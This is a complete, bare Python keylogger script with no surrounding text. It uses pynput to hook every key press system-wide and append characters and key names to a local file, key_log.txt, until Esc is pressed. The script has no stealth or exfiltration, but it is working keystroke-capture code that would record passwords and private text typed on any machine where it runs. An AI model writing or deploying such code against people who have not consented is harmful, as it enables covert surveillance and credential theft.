from pynput import keyboard

# Define the log file name
log_file = "key_log.txt"

# Function to write the key to the log file
def write_to_file(key):
    with open(log_file, "a") as f:
        try:
            f.write(str(key.char))
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{str(key)}] ")

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events
def on_release(key):
    # Stop listener on pressing the Esc key
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

